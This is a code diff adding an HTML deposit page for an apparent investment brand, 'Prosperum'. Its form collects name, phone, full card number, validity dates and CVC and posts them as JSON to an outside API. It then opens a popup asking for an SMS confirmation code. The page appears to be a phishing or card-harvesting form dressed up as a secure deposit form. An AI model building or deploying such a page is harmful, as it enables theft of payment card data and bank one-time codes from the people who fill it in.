@@ -1,0 +1,279 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Prosperum | Deposit</title>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+			<link rel="icon" href="../wp-content\themes\bitrader\assets\img\logo\preloader.png" sizes="32x32" />
+<link rel="icon" href="../wp-content\themes\bitrader\assets\img\logo\preloader.png" sizes="192x192" />
+  <style>
+    :root{
+      --bg-1:#0f1115;
+      --bg-2:#141823;
+      --text:#e6e6e6;
+      --muted:#b9b9b9;
+      --gold:#d4af37;
+      --gold-hover:#c39a26;
+      --danger:#ff6b6b;
+      --ok:#3ddc97;
+      --radius:16px;
+      --shadow:0 10px 40px rgba(0,0,0,.35);
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
+      color:var(--text);
+      background:
+        radial-gradient(1200px 600px at 80% -10%, rgba(255,255,255,.04), transparent 60%),
+        linear-gradient(130deg, #0d1014 0%, #0f1115 35%, #12151b 100%);
+      background-color:var(--bg-1);
+    }
+    .wrap{min-height:100%;display:grid;place-items:center;padding:32px 16px;}
+    .card{
+      width:100%;max-width:560px;background:linear-gradient(180deg,rgba(255,255,255,.02),rgba(255,255,255,.00)),var(--bg-2);
+      border:1px solid rgba(255,255,255,.06);border-radius:var(--radius);
+      box-shadow:var(--shadow);padding:32px;position:relative;overflow:hidden;
+    }
+    .brand{color:var(--gold);font-weight:700;text-transform:uppercase;font-size:12px;margin-bottom:18px;}
+    .title{margin:0 0 8px 0;font-size:28px;font-weight:700;}
+    .subtitle{margin:0 0 24px 0;color:var(--muted);font-size:14px;}
+    form{display:grid;gap:16px;}
+    .field{display:grid;gap:8px;}
+    label{font-size:13px;color:var(--muted);}
+    input{
+      width:100%;padding:14px;background:#0f1218;color:var(--text);
+      border:1px solid rgba(255,255,255,.08);border-radius:12px;outline:none;
+      transition:border .2s ease,box-shadow .2s ease;
+    }
+    input::placeholder{color:#8b8f97;}
+    input:focus{border-color:rgba(212,175,55,.6);box-shadow:0 0 0 4px rgba(212,175,55,.15);}
+    .error{font-size:12px;color:var(--danger);display:none;}
+    .field.invalid .error{display:block;}
+    .field.valid input{border-color:rgba(61,220,151,.55);}
+    .inline{display:flex;gap:12px;}
+    .inline .field{flex:1;}
+    .actions{margin-top:8px;display:flex;gap:12px;align-items:center;}
+    button{
+      cursor:pointer;border:0;padding:14px 18px;border-radius:12px;
+      background:linear-gradient(180deg,var(--gold),var(--gold-hover));
+      color:#1b1b1b;font-weight:700;box-shadow:0 8px 24px rgba(212,175,55,.25);
+      transition:transform .06s ease,filter .2s ease;
+    }
+    button:hover{filter:saturate(1.05) brightness(1.02);}
+    button:active{transform:translateY(1px);}
+    .status{font-size:13px;color:var(--muted);min-height:1.2em;}
+
+    /* === POPUP === */
+    .popup{
+      position:fixed;inset:0;background:rgba(0,0,0,.65);
+      display:flex;align-items:center;justify-content:center;
+      z-index:1000;visibility:hidden;opacity:0;
+      transition:opacity .3s ease,visibility .3s ease;
+    }
+    .popup.active{visibility:visible;opacity:1;}
+    .popup-content{
+      background:var(--bg-2);
+      padding:40px 60px;border-radius:16px;
+      text-align:center;box-shadow:var(--shadow);
+    }
+    .loader{
+      width:60px;height:60px;
+      border:5px solid rgba(255,255,255,.1);
+      border-top:5px solid var(--gold);
+      border-radius:50%;
+      animation:spin 1s linear infinite;
+      margin:0 auto 20px auto;
+    }
+    @keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <main class="card" role="main">
+      <div class="brand">Prosperum • Secure Form</div>
+      <h1 class="title">Deposit Details</h1>
+      <p class="subtitle">Enter your card details below</p>
+
+      <form id="prosperumForm" novalidate>
+        <div class="field">
+          <label>Name</label>
+          <input id="firstName" placeholder="John" pattern="^[A-Za-z][A-Za-z\\s\\-']{0,48}$" maxlength="50" required>
+          <div class="error">Only Latin letters.</div>
+        </div>
+
+        <div class="field">
+          <label>Last Name</label>
+          <input id="lastName" placeholder="Doe" pattern="^[A-Za-z][A-Za-z\\s\\-']{0,48}$" maxlength="50" required>
+          <div class="error">Only Latin letters.</div>
+        </div>
+
+        <div class="field">
+          <label>Phone Number</label>
+          <input id="phone" placeholder="+1234567890" inputmode="tel" pattern="^[0-9+]{7,15}$" maxlength="15" required>
+          <div class="error">Enter valid phone number.</div>
+        </div>
+
+        <div class="field">
+          <label>Card Number</label>
+          <input id="digits16" placeholder="1234567812345678" inputmode="numeric" pattern="^[0-9]{16}$" maxlength="16" required>
+          <div class="error">16 digits required.</div>
+        </div>
+
+        <div class="inline">
+          <div class="field">
+            <label>Valid From (MM/YY)</label>
+            <input id="validFrom" placeholder="01/24" inputmode="numeric" maxlength="5" required>
+            <div class="error">Format MM/YY.</div>
+          </div>
+          <div class="field">
+            <label>Valid Thru (MM/YY)</label>
+            <input id="validThru" placeholder="12/28" inputmode="numeric" maxlength="5" required>
+            <div class="error">Format MM/YY.</div>
+          </div>
+        </div>
+
+        <div class="inline">
+          <div class="field">
+            <label>CVC</label>
+            <input id="cvc" placeholder="123" inputmode="numeric" pattern="^[0-9]{3}$" maxlength="3" required>
+            <div class="error">3 digits required.</div>
+          </div>
+          <div class="field">
+            <label>Amount ($)</label>
+            <input id="amount" placeholder="1000" inputmode="numeric" pattern="^[0-9]{1,7}$" maxlength="7" required>
+            <div class="error">Only digits.</div>
+          </div>
+        </div>
+
+        <div class="actions">
+          <button type="submit">Submit</button>
+          <div class="status" id="status"></div>
+        </div>
+      </form>
+    </main>
+  </div>
+
+  <div class="popup" id="popup">
+    <div class="popup-content">
+      <div class="loader"></div>
+      <div>Loading...</div>
+    </div>
+  </div>
+
+  <div class="popup" id="smsPopup">
+  <div class="popup-content">
+    <h3>We`ve sended a sms code</h3>
+    <p>Enter sms-code</p>
+
+    <input id="smsCode" placeholder="Введите код" maxlength="6" 
+      style="width:100%;padding:12px;font-size:16px;margin:12px 0;border-radius:10px;border:1px solid rgba(255,255,255,0.2);background:#0f1218;color:#fff;"
+    >
+
+    <button id="confirmSmsBtn" style="width:100%;padding:12px;font-size:16px;border-radius:10px;background:linear-gradient(180deg,var(--gold),var(--gold-hover));border:none;color:#000;font-weight:700;cursor:pointer;">
+      Submit
+    </button>
+
+    <div id="smsStatus" style="margin-top:10px;font-size:14px;color:#b9b9b9;"></div>
+  </div>
+</div>
+
+
+  <script>
+  const fields = [
+    "firstName", "lastName", "phone", "digits16",
+    "validFrom", "validThru", "cvc", "amount"
+  ].map(id => document.getElementById(id));
+  
+  const popup = document.getElementById('popup');
+  const statusEl = document.getElementById('status');
+
+  function setValidity(f, ok) {
+    const wrap = f.closest('.field');
+    wrap.classList.toggle('valid', ok);
+    wrap.classList.toggle('invalid', !ok);
+  }
+
+  function formatExpiryInput(e) {
+    let value = e.target.value.replace(/\D/g, ""); 
+    if (value.length > 2) value = value.slice(0, 2) + "/" + value.slice(2, 4);
+    e.target.value = value.slice(0, 5);
+  }
+
+function isValidExpiry(value) {
+  return /^(0[1-9]|1[0-2])\/\d{2}$/.test(value);
+}
+
+fields.forEach(f => {
+  f.addEventListener("input", () => {
+    if (f.id === "validFrom" || f.id === "validThru")
+      setValidity(f, isValidExpiry(f.value));
+    else
+      setValidity(f, f.checkValidity());
+  });
+});
+
+
+  const validFrom = document.getElementById("validFrom");
+  const validThru = document.getElementById("validThru");
+  [validFrom, validThru].forEach(input => {
+    input.addEventListener("input", formatExpiryInput);
+  });
+
+  
+  fields.forEach(f => {
+    f.addEventListener("input", () => setValidity(f, f.checkValidity()));
+  });
+
+  document.getElementById('prosperumForm').addEventListener('submit', async e => {
+    e.preventDefault();
+    let valid = true;
+    fields.forEach(f => {
+      if (!f.checkValidity()) { setValidity(f, false); valid = false; }
+    });
+    if (!valid) { statusEl.textContent = 'Check all fields!'; return; }
+
+    const payload = Object.fromEntries(fields.map(f => [f.id, f.value.trim()]));
+    popup.classList.add('active'); 
+    statusEl.textContent = '';
+
+    try {
+      const res = await fetch('https://api.prosperum.investments/deposit-form', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      popup.classList.remove('active'); 
+
+      if (!res.ok) throw new Error('Server error');
+popup.classList.remove('active'); 
+document.getElementById('smsPopup').classList.add('active');
+      e.target.reset();
+      fields.forEach(f => f.closest('.field').classList.remove('valid', 'invalid'));
+    } catch (err) {
+      popup.classList.remove('active');
+      statusEl.style.color = 'var(--danger)';
+      statusEl.textContent = err.message || 'Error';
+    }
+  });
+  const smsPopup = document.getElementById('smsPopup');
+const smsInput = document.getElementById('smsCode');
+const confirmSmsBtn = document.getElementById('confirmSmsBtn');
+const smsStatus = document.getElementById('smsStatus');
+
+confirmSmsBtn.addEventListener("click", () => {
+  const code = smsInput.value.trim();
+
+  if (code.length !== 6) {
+    smsStatus.style.color = "var(--danger)";
+    smsStatus.textContent = "Enter 6-digit code.";
+    return;
+  }
+});
+</script>
+</body>
+</html>
